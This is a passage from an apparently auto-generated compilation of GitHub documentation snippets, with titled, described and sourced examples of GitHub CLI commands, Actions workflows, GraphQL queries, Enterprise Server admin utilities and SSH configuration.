add KEY-FILE --title \"personal laptop\"\n```\n\n----------------------------------------\n\nTITLE: GraphQL Mutation to Add Reaction to Issue\nDESCRIPTION: This GraphQL mutation adds an emoji reaction to a specified issue. It requires the issue's ID ('subjectId') and the content of the reaction (e.g., 'HOORAY'). The mutation uses the addReaction mutation, passing the subjectId and content within the input object.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/forming-calls-with-graphql.md#_snippet_5\n\nLANGUAGE: GraphQL\nCODE:\n```\nmutation AddReactionToIssue {\n  addReaction(input:{subjectId:\"MDU6SXNzdWUyMzEzOTE1NTE=\",content:HOORAY}) {\n    reaction {\n      content\n    }\n    subject {\n      id\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Scoped Yarn Registry URL\nDESCRIPTION: This command sets the Yarn registry URL for a specific scope, allowing different registries for different dependencies.  It's useful when using a mix of public and private packages. Requires Yarn to be installed.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/guidance-for-the-configuration-of-private-registries-for-dependabot.md#_snippet_24\n\nLANGUAGE: Shell\nCODE:\n```\nyarn config set @<SCOPE>:registry <url>\n```\n\n----------------------------------------\n\nTITLE: Configuring Elasticsearch Workers via CLI\nDESCRIPTION: This snippet demonstrates how to configure the number of Elasticsearch index repair workers using the command-line interface. This allows administrators to adjust the speed of the index rebuild process after the Elasticsearch upgrade.  The `ghe-config-apply` command is required to apply the changes.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/upgrading-your-instance/performing-an-upgrade/preparing-for-the-elasticsearch-upgrade.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nghe-config app.github.es-workers NUMBER-OF-WORKERS\n```\n\n----------------------------------------\n\nTITLE: Reusable Workflow with Outputs\nDESCRIPTION: This YAML snippet defines a reusable workflow with outputs. It defines workflow outputs, maps them to job outputs, and sets step outputs using environment variables.  The `on.workflow_call.outputs` section defines workflow outputs, while the `jobs.<job_id>.outputs` maps step outputs to job outputs.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/reusing-workflows.md#_snippet_9\n\nLANGUAGE: YAML\nCODE:\n```\nname: Reusable workflow\n\non:\n  workflow_call:\n    # Map the workflow outputs to job outputs\n    outputs:\n      firstword:\n        description: \"The first output string\"\n        value: ${{ jobs.example_job.outputs.output1 }}\n      secondword:\n        description: \"The second output string\"\n        value: ${{ jobs.example_job.outputs.output2 }}\n\njobs:\n  example_job:\n    name: Generate output\n    runs-on: ubuntu-latest\n    # Map the job outputs to step outputs\n    outputs:\n      output1: ${{ steps.step1.outputs.firstword }}\n      output2: ${{ steps.step2.outputs.secondword }}\n    steps:\n      - id: step1\n        run: echo \"firstword=hello\" >> $GITHUB_OUTPUT\n      - id: step2\n        run: echo \"secondword=world\" >> $GITHUB_OUTPUT\n```\n\n----------------------------------------\n\nTITLE: Rebalancing Allocations with ghe-cluster-balance rebalance\nDESCRIPTION: This snippet shows how to rebalance allocations using the `ghe-cluster-balance rebalance` utility with the `-j` flag to specify jobs. It checks the distribution of existing jobs and redistributes them if any are unbalanced.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/rebalancing-cluster-workloads.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nghe-cluster-balance rebalance -j JOB\n```\n\n----------------------------------------\n\nTITLE: Job Dependencies in Azure Pipelines (YAML)\nDESCRIPTION: This YAML snippet shows how to define job dependencies in Azure Pipelines using the `dependsOn` key.  It creates a workflow with an initial job, followed by two parallel jobs (`fanout1`, `fanout2`), and a final job (`fanin`) that depends on both `fanout1` and `fanout2`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-azure-pipelines-to-github-actions.md#_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  - job: initial\n    pool:\n      vmImage: 'ubuntu-latest'\n    steps:\n      - script: echo \"This job will be run first.\"\n  - job: fanout1\n    pool:\n      vmImage: 'ubuntu-latest'\n    dependsOn: initial\n    steps:\n      - script: echo \"This job will run after the initial job, in parallel with fanout2.\"\n  - job: fanout2\n    pool:\n      vmImage: 'ubuntu-latest'\n    dependsOn: initial\n    steps:\n      - script: echo \"This job will run after the initial job, in parallel with fanout1.\"\n  - job: fanin:\n    pool:\n      vmImage: 'ubuntu-latest'\n    dependsOn: [fanout1, fanout2]\n    steps:\n      - script: echo \"This job will run after fanout1 and fanout2 have finished.\"\n```\n\n----------------------------------------\n\nTITLE: Listing SSH Keys Known to ssh-agent - Shell\nDESCRIPTION: This command lists the SSH keys that are currently loaded into `ssh-agent`. If no keys are listed, you'll need to add your key using `ssh-add`.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/using-ssh-agent-forwarding.md#_snippet_7\n\nLANGUAGE: Shell\nCODE:\n```\nssh-add -L\n```\n\n----------------------------------------\n\nTITLE: Unsuspending a User (Shell)\nDESCRIPTION: Unsuspends the specified user, granting them access to login and repositories, using the `ghe-user-unsuspend` utility. Replace `USERNAME` with the username to unsuspend.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_113\n\nLANGUAGE: shell\nCODE:\n```\nghe-user-unsuspend USERNAME\n```\n\n----------------------------------------\n\nTITLE: Creating a non-Go precompiled extension\nDESCRIPTION: Creates a project for a non-Go precompiled extension. Replace `EXTENSION-NAME` with the extension's name and use the `--precompiled=other` flag. This command scaffolds the project with workflow files necessary for building the extension.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/creating-github-cli-extensions.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\ngh extension create --precompiled=other EXTENSION-NAME\n```\n\n----------------------------------------\n\nTITLE: Syncing a Fork with GitHub CLI\nDESCRIPTION: This snippet demonstrates how to sync a fork with its upstream repository using the `gh repo sync` command. It requires the GitHub CLI to be installed and configured. The `-b` flag specifies the branch to sync. The `--force` flag overwrites destination branch.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/working-with-forks/syncing-a-fork.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh repo sync owner/cli-fork -b BRANCH-NAME\n```\n\n----------------------------------------\n\nTITLE: Running a Node.js Application in Codespaces\nDESCRIPTION: This snippet demonstrates how to start a Node.js web application within a GitHub Codespace using the `npm run dev` command. This command executes the script defined as \"dev\" in the `package.json` file, initiating the application server. The codespace automatically detects the port the application is running on and forwards it, enabling access via a browser.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/quickstart.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpm run dev\n```\n\n----------------------------------------\n\nTITLE: Verifying Artifact Attestations with Specific Workflow (Bash)\nDESCRIPTION: This bash snippet demonstrates verifying attestation ensuring that the artifact was built with a specific workflow using the `--signer-workflow` flag. It requires the organization name and the full path to the reusable workflow.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-and-reusable-workflows-to-achieve-slsa-v1-build-level-3.md#_snippet_2\n\nLANGUAGE: Bash\nCODE:\n```\ngh attestation verify -o ORGANIZATION_NAME --signer-workflow REUSABLE_ORGANIZATION_NAME/REUSABLE_REPOSITORY_NAME/.github/workflows/reusable.yml PATH/TO/YOUR/BUILD/ARTIFACT-BINARY\n```\n\n----------------------------------------\n\nTITLE: Viewing a GitHub repository using gh repo view\nDESCRIPTION: This command retrieves and displays the repository description and README.md content.  Using the `--web` flag opens the repository in the default web browser. It takes the repository owner and name as input.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/quickstart.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\ngh repo view OWNER/REPO\n```\n\nLANGUAGE: Shell\nCODE:\n```\ngh repo view OWNER/REPO --web\n```\n\n----------------------------------------\n\nTITLE: Pushing the Subversion imported repository (Shell)\nDESCRIPTION: This command pushes the imported Subversion repository to GitHub Enterprise Server. It uses the `--mirror` option to ensure all refs are pushed. Replace `PUSH-URL-ON-GITHUB-ENTERPRISE` with the actual push URL on GitHub Enterprise.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/importing-source-code/using-the-command-line-to-import-source-code/importing-from-other-version-control-systems-with-the-administrative-shell.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\ngit push --mirror PUSH-URL-ON-GITHUB-ENTERPRISE\n```\n\n----------------------------------------\n\nTITLE: Specifying GitHub Enterprise URI in CodeQL for VS Code (JSON)\nDESCRIPTION: This JSON snippet demonstrates how to configure the GitHub Enterprise URI for the CodeQL for VS Code extension. By setting the `github-enterprise.uri` property, the extension will use the specified URL for downloading databases and creating repository lists for variant analysis. This is specifically useful when using GitHub Enterprise Server or GitHub AE.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-for-vs-code/using-the-advanced-functionality-of-the-codeql-for-vs-code-extension/customizing-settings.md#_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n    \"github-enterprise.uri\": \"{% data variables.enterprise.data_residency_domain %}\"\n```\n\n----------------------------------------\n\nTITLE: Uploading Go Test Results as Artifacts\nDESCRIPTION: This workflow uploads Go test results as artifacts. It uses a matrix strategy to test with different Go versions, runs tests and saves the results as a JSON file, and then uploads the JSON file as an artifact using the `upload-artifact` action. The artifact name includes the Go version.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-go.md#_snippet_6\n\nLANGUAGE: YAML\nCODE:\n```\nname: Upload Go test results\n\non: [push]\n\njobs:\n  build:\n\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        go-version: [ '1.19', '1.20', '1.21.x' ]\n\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Setup Go\n        uses: {% data reusables.actions.action-setup-go %}\n        with:\n          go-version: {% raw %}${{ matrix.go-version }}{% endraw %}\n      - name: Install dependencies\n        run: go get .\n      - name: Test with Go\n        run: go test -json > TestResults-{% raw %}${{ matrix.go-version }}{% endraw %}.json\n      - name: Upload Go test results\n        uses: {% data reusables.actions.action-upload-artifact %}\n        with:\n          name: Go-results-{% raw %}${{ matrix.go-version }}{% endraw %}\n          path: TestResults-{% raw %}${{ matrix.go-version }}{% endraw %}.json\n```\n\n----------------------------------------\n\nTITLE: Defining Pack Groups in qlpack.yml (YAML)\nDESCRIPTION: This snippet demonstrates how to define logical groupings for CodeQL packs within a workspace. Groups are used to apply pack operations to subsets of packs.  The example shows how to include a pack in both the `java` and `experimental` groups.  This allows for selective publishing using `codeql pack publish --groups java,-experimental`.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/publishing-and-using-codeql-packs.md#_snippet_12\n\nLANGUAGE: YAML\nCODE:\n```\ngroups:\n  - java\n  - experimental\n```\n\n----------------------------------------\n\nTITLE: Generating Artifact Attestation for Binaries with GitHub Actions\nDESCRIPTION: This snippet shows how to use the `actions/attest-build-provenance` action in a GitHub Actions workflow to generate an artifact attestation for a binary file. It specifies the path to the binary using the `subject-path` parameter. This action generates an attestation that can be used to verify the provenance of the binary.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-to-establish-provenance-for-builds.md#_snippet_2\n\nLANGUAGE: YAML\nCODE:\n```\n- name: Generate artifact attestation\n  uses: actions/attest-build-provenance@v2\n  with:\n    subject-path: 'PATH/TO/ARTIFACT'\n```\n\n----------------------------------------\n\nTITLE: Configure Git to Use Notepad++ (Windows)\nDESCRIPTION: This command configures Git to use Notepad++ as the default editor on Windows. The command includes parameters to avoid issues with multiple instances, tab bars, sessions, and plugins.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/git-basics/associating-text-editors-with-git.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ngit config --global core.editor \"'C:/Program Files (x86)/Notepad++/notepad++.exe' -multiInst -notabbar -nosession -noPlugin\"\n```\n\n----------------------------------------\n\nTITLE: Example Link Header\nDESCRIPTION: This is an example of a link header returned by the GitHub REST API when pagination is used. It provides URLs for the previous, next, first, and last pages of results. The `rel` attribute specifies the relationship of the link to the current page.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/using-pagination-in-the-rest-api.md#_snippet_3\n\nLANGUAGE: HTTP\nCODE:\n```\nlink: <https://api.github.com/repositories/1300192/issues?page=2>; rel=\"prev\", <https://api.github.com/repositories/1300192/issues?page=4>; rel=\"next\", <https://api.github.com/repositories/1300192/issues?page=515>; rel=\"last\", <https://api.github.com/repositories/1300192/issues?page=1>; rel=\"first\"\n```\n\n----------------------------------------\n\nTITLE: Adding SSH key to ssh-agent with Keychain - Shell\nDESCRIPTION: This command adds the specified SSH private key to the ssh-agent and stores the passphrase in the macOS keychain using the `--apple-use-keychain` flag.  It requires macOS specific ssh-add version.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\nssh-add --apple-use-keychain ~/.ssh/id_ed25519\n```\n\n----------------------------------------\n\nTITLE: Setting a warning message in Bash\nDESCRIPTION: This snippet demonstrates how to set a warning message using the `warning` workflow command in Bash.  It includes the file, line, column, endColumn, and title parameters for the warning message.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\necho \"::warning file=app.js,line=1,col=5,endColumn=7,title=YOUR-TITLE::Missing semicolon\"\n```\n\n----------------------------------------\n\nTITLE: Creating an Issue with Assignee, Label, Milestone, and Project\nDESCRIPTION: This snippet expands on the previous example, demonstrating how to include assignees, labels, a project, and a milestone when creating an issue using the GitHub CLI.  It uses the `--assignee`, `--label`, `--project`, and `--milestone` flags to set these attributes.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/tracking-your-work-with-issues/using-issues/creating-an-issue.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngh issue create --title \"My new issue\" --body \"Here are more details.\" --assignee @me,monalisa --label \"bug,help wanted\" --project onboarding --milestone \"learning codebase\"\n```\n\n----------------------------------------\n\nTITLE: Authenticating with GitHub CLI\nDESCRIPTION: This snippet shows how to authenticate with the GitHub CLI using a web-based flow. The `gh auth login` command with the `--web` flag initiates the authentication process, which will open a web browser to complete the login. The `-h github.com` flag explicitly specifies the GitHub.com host.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/building-copilot-extensions/debugging-your-github-copilot-extension.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ngh auth login --web -h github.com\n```\n\n----------------------------------------\n\nTITLE: Adding NuGet Source with GitHub Token in Actions Workflow\nDESCRIPTION: This command configures the NuGet CLI to use GitHub Packages as a package source within a GitHub Actions workflow. It uses the `GITHUB_TOKEN` secret for authentication, replacing placeholders for namespace and username.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-nuget-registry.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ndotnet nuget add source --username USERNAME --password {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %} --store-password-in-clear-text --name github \"https://{% ifversion fpt or ghec %}nuget.pkg.github.com{% else %}nuget.HOSTNAME{% endif %}/NAMESPACE/index.json\"\n```\n\n----------------------------------------\n\nTITLE: Stopping replication temporarily using ghe-repl-stop (Shell)\nDESCRIPTION: This shell command stops the replication process on the specified GitHub Enterprise Server replica. It requires administrative access to the replica server. The command is executed directly in the shell environment.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-high-availability/removing-a-high-availability-replica.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nghe-repl-stop\n```\n\n----------------------------------------\n\nTITLE: Viewing Logs with Nomad CLI\nDESCRIPTION: This command retrieves logs for the 'nes' job from any node in the Nomad cluster. It relies on the Nomad CLI being properly configured and accessible in the shell environment.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/monitoring-the-health-of-your-cluster-nodes-with-node-eligibility-service.md#_snippet_14\n\nLANGUAGE: shell\nCODE:\n```\nnomad alloc logs -job nes\n```\n\n----------------------------------------\n\nTITLE: Pulling MinIO Docker Image (Shell)\nDESCRIPTION: This command pulls the official MinIO Docker image from Docker Hub. This is a prerequisite for running MinIO in a Docker container, which is a convenient way to deploy and manage MinIO. Requires Docker to be installed.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-packages/quickstart-for-configuring-your-minio-storage-bucket-for-github-packages.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\ndocker pull minio/minio\n```\n\n----------------------------------------\n\nTITLE: Installing OpenSSH with Homebrew\nDESCRIPTION: This snippet shows how to install OpenSSH on macOS using the Homebrew package manager. Installing OpenSSH might affect how passphrases are retrieved from the Apple keychain, requiring users to enter them manually or use a hardware security key for authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/troubleshooting-ssh/error-unknown-key-type.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nbrew install openssh\n```\n\n----------------------------------------\n\nTITLE: Executing gh environment command\nDESCRIPTION: This snippet shows how to execute the gh environment command to view the environment variables that can affect GitHub CLI. No dependencies are required.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/github-cli-reference.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngh environment\n```\n\n----------------------------------------\n\nTITLE: Configuring Variant Analysis Repositories in CodeQL for VS Code (JSON)\nDESCRIPTION: This JSON snippet shows the structure of the `databases.json` file used to configure variant analysis repositories in the CodeQL for VS Code extension. It defines repository lists, owners, and individual repositories, allowing users to customize the items displayed in the \"Variant Analysis Repositories\" view. The `version` key specifies the schema version of the databases file.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-for-vs-code/using-the-advanced-functionality-of-the-codeql-for-vs-code-extension/customizing-settings.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"version\": 1,\n  \"databases\": {\n    \"variantAnalysis\": {\n      \"repositoryLists\": [\n        {\n          \"name\": \"My favorite JavaScript repos\",\n          \"repositories\": [\n            \"facebook/react\",\n            \"babel/babel\",\n            \"angular/angular\"\n          ]\n        }\n      ],\n      \"owners\": [\n        \"microsoft\"\n      ],\n      \"repositories\": [\n        \"apache/hadoop\"\n      ]\n    }\n  },\n  \"selected\": {\n    \"kind\": \"variantAnalysisSystemDefinedList\",\n    \"listName\": \"top_10\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Adding VS Code extensions in devcontainer.json\nDESCRIPTION: This snippet demonstrates how to configure the `customizations` property in `devcontainer.json` to install specific VS Code extensions.  It installs the \"Code Spell Checker\" and the \"Extension Pack for Java\" extensions.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/setting-up-your-project-for-codespaces/adding-a-dev-container-configuration/setting-up-your-java-project-for-codespaces.md#_snippet_3\n\nLANGUAGE: jsonc\nCODE:\n```\n// Configure tool-specific properties.\n   \"customizations\": {\n     // Configure properties specific to VS Code.\n     \"vscode\": {\n       // Add the IDs of extensions you want installed when the container is created.\n       \"extensions\": [\n         \"streetsidesoftware.code-spell-checker\",\n         \"vscjava.vscode-java-pack\"\n       ]\n     }\n   }\n```\n\n----------------------------------------\n\nTITLE: Using an Action in a Private Repository (YAML)\nDESCRIPTION: This YAML snippet demonstrates using an action from a private repository. It requires checking out the private repository using the `actions/checkout` action and providing a Personal Access Token (PAT) as a secret. The action is then referenced locally.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_17\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  my_first_job:\n    steps:\n      - name: Check out repository\n        uses: {% data reusables.actions.action-checkout %}\n        with:\n          repository: octocat/my-private-repo\n          ref: v1.0\n          token: {% raw %}${{ secrets.PERSONAL_ACCESS_TOKEN }}{% endraw %}\n          path: ./.github/actions/my-private-repo\n      - name: Run my action\n        uses: ./.github/actions/my-private-repo/my-action\n```\n\n----------------------------------------\n\nTITLE: Workflow with Dynamic Matrix Generation (YAML)\nDESCRIPTION: This YAML file defines a GitHub Actions workflow that triggers on the `repository_dispatch` event. It extracts the `versions` array from the event's payload to define the `version` matrix. The workflow then uses the matrix `version` value to set the `node-version` for the `setup-node` action.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/matrix-from-context.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\non:\n  repository_dispatch:\n    types:\n      - test\n \njobs:\n  example_matrix:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        version: {% raw %}${{ github.event.client_payload.versions }}{% endraw %}\n    steps:\n      - uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: {% raw %}${{ matrix.version }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Rebuilding a Codespace using GitHub CLI\nDESCRIPTION: This command rebuilds a codespace using the `devcontainer.json` file. Adding the `--full` flag performs a full rebuild. This is useful when the codespace environment needs to be refreshed based on changes to the dev container configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/using-github-codespaces-with-github-cli.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\ngh codespace rebuild\n```\n\n----------------------------------------\n\nTITLE: Access Token Response (JSON)\nDESCRIPTION: JSON response format for the access token request when the user has authorized the device. It includes the access token, token type, and granted scopes.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/oauth-apps/building-oauth-apps/authorizing-oauth-apps.md#_snippet_11\n\nLANGUAGE: json\nCODE:\n```\n{\n \"access_token\": \"gho_16C7e42F292c6912E7710c838347Ae178B4a\",\n  \"token_type\": \"bearer\",\n  \"scope\": \"repo,gist\"\n}\n```\n\n----------------------------------------\n\nTITLE: GraphQL Simple Query\nDESCRIPTION: A basic GraphQL query to fetch the viewer's login.  It demonstrates a simple query structure for verifying access to the GraphQL API using a client such as the Altair GraphQL Client IDE.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/using-the-explorer.md#_snippet_1\n\nLANGUAGE: graphql\nCODE:\n```\nquery {\n  viewer {\n    login\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Controlling Maintenance Mode with ghe-maintenance (Shell)\nDESCRIPTION: The `ghe-maintenance` utility controls the state of maintenance mode on the GitHub Enterprise Server instance. While primarily used by the Management Console, it can be used directly by administrators to enable or disable maintenance mode. Use `-h` flag for additional options.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_12\n\nLANGUAGE: shell\nCODE:\n```\nghe-maintenance -h\n```\n\n----------------------------------------\n\nTITLE: Creating a CodeQL Database\nDESCRIPTION: This command creates a CodeQL database for a specified language.  It requires the path for the new database and the language identifier. The database directory will be created if it doesn't exist. The language identifier should match one of the supported CodeQL languages.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/preparing-your-code-for-codeql-analysis.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql database create <database> --language=<language-identifier>\n```\n\n----------------------------------------\n\nTITLE: Full Ruby CI Workflow with Matrix Strategy\nDESCRIPTION: This YAML snippet provides a complete example of a Ruby CI workflow with a matrix strategy. It defines jobs to run on Ubuntu, testing against Ruby versions 3.1, 3.0, and 2.7. It uses `ruby/setup-ruby` to set up each Ruby version, installs dependencies, and runs tests.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-ruby.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\n{% data reusables.actions.actions-not-certified-by-github-comment %}\n\n{% data reusables.actions.actions-use-sha-pinning-comment %}\n\nname: Ruby CI\n\non:\n  push:\n    branches: [ main ]\n  pull_request:\n    branches: [ main ]\n\njobs:\n  test:\n\n    runs-on: ubuntu-latest\n\n    strategy:\n      matrix:\n        ruby-version: ['3.1', '3.0', '2.7']\n\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: {% raw %}Set up Ruby ${{ matrix.ruby-version }}{% endraw %}\n        uses: ruby/setup-ruby@ec02537da5712d66d4d50a0f33b7eb52773b5ed1\n        with:\n          ruby-version: {% raw %}${{ matrix.ruby-version }}{% endraw %}\n      - name: Install dependencies\n        run: bundle install\n      - name: Run tests\n        run: bundle exec rake\n```\n\n----------------------------------------\n\nTITLE: Advanced Issue Filter: Boolean AND\nDESCRIPTION: This example demonstrates how to use the `AND` boolean operator to filter issues that match multiple criteria. Specifically, it finds issues labeled \"question\" that are assigned to the user @octocat. The `AND` operator ensures that both conditions must be true for an issue to be included in the results.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/tracking-your-work-with-issues/using-issues/filtering-and-searching-issues-and-pull-requests.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nlabel:\"question\" AND assignee:octocat\n```\n\n----------------------------------------\n\nTITLE: Error: Remote Rejected (Read-Only)\nDESCRIPTION: This snippet shows the error message that appears when attempting to push commits directly to the read-only `refs/pull/` namespace.  It indicates a permission error.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/reviewing-changes-in-pull-requests/checking-out-pull-requests-locally.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\n! [remote rejected] HEAD -> refs/pull/1/head (deny updating a hidden ref)\nerror: failed to push some refs to 'git@github.local:USERNAME/REPOSITORY.git'\n```\n\n----------------------------------------\n\nTITLE: Searching audit log based on country\nDESCRIPTION: Example search queries that filter events in the audit log based on the `country` qualifier, using both two-letter short codes and full country names. Countries with spaces in the name need to be wrapped in quotation marks.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise/searching-the-audit-log-for-your-enterprise.md#_snippet_4\n\nLANGUAGE: Text\nCODE:\n```\ncountry:de\n```\n\nLANGUAGE: Text\nCODE:\n```\ncountry:Mexico\n```\n\nLANGUAGE: Text\nCODE:\n```\ncountry:\"United States\"\n```\n\n----------------------------------------\n\nTITLE: Displaying Audit Options - Bash\nDESCRIPTION: This command displays available options for the `audit` subcommand of the GitHub Actions Importer CLI.  The `audit` subcommand is used to analyze your existing CI/CD pipelines and plan your migration to GitHub Actions. The `-h` flag shows the help message. The command is executed via the `gh` CLI.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/automating-migration-with-github-actions-importer.md#_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n$ gh actions-importer audit -h\n```\n\n----------------------------------------\n\nTITLE: Example pre-receive hook script (always_reject.sh)\nDESCRIPTION: This shell script demonstrates a simple pre-receive hook that rejects all pushes. It is useful for temporarily locking a repository. It should be placed in the `hooks/pre-receive` file in the git repository.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/enforcing-policies/enforcing-policy-with-pre-receive-hooks/creating-a-pre-receive-hook-script.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\n#!/usr/bin/env bash\n\necho \"error: rejecting all pushes\"\nexit 1\n```\n\n----------------------------------------\n\nTITLE: Querying GraphQL Schema for a Specific Type\nDESCRIPTION: This GraphQL query retrieves details about a specific type in the schema, in this case, the 'Repository' type. It fetches the name, kind, description, and fields of the specified type, allowing detailed inspection of a particular schema component.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/introduction-to-graphql.md#_snippet_2\n\nLANGUAGE: GraphQL\nCODE:\n```\nquery {\n  __type(name: \"Repository\") {\n    name\n    kind\n    description\n    fields {\n      name\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Listing Services with ghe-service-list (Shell)\nDESCRIPTION: The `ghe-service-list` utility lists all services that have been started or stopped on the GitHub Enterprise Server appliance. This provides a quick overview of the status of each service.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_19\n\nLANGUAGE: shell\nCODE:\n```\n$ ghe-service-list\nactive\n  - alambic\n  - alive\n  - aqueduct-lite\n  - authzd\n  - babeld\n  - codeload\n  - consul, process 17114\n  - consul-template, process 19493\n  - driftwood\n  - elasticsearch\n  - enterprise-manage-unicorn, process 9359\n  - ghe-user-disk, process 2545\n  - git-daemon\n  - github-env\n  - github-gitauth\n  - github-resqued\n  - github-stream-processors\n  - github-timerd\n  - github-unicorn\n  - gitrpcd\n  - governor\n  - gpgverify\n  - grafana-server, process 19314\n  - graphite-web, process 20189\n  - hookshot-go\n  - kafka-lite\n  - kredz\n  - lfs-server\n  - mail-replies\n  - memcached\n  - minio\n  - mysql\n  - nginx\n  - nomad, process 19562\n  - pages\n  - postfix\n  - redis\n  - spokesd\n  - spokes-sweeper\n  - svnbridge\n  - token-scanning-api\n  - token-scanning-backfill-worker\n  - token-scanning-hydro-consumer\n  - token-scanning-incremental-worker\n  - token-scanning-udp-backfill-worker\n  - treelights\n  - turboscan\n  - viewscreen\n\ninactive\n  - wireguard\n```\n\n----------------------------------------\n\nTITLE: Starting SSH Agent - PowerShell\nDESCRIPTION: These PowerShell commands start the ssh-agent service if it's not already running, setting the startup type to Manual. It requires administrative privileges to modify the service configuration.\nSOURCE: 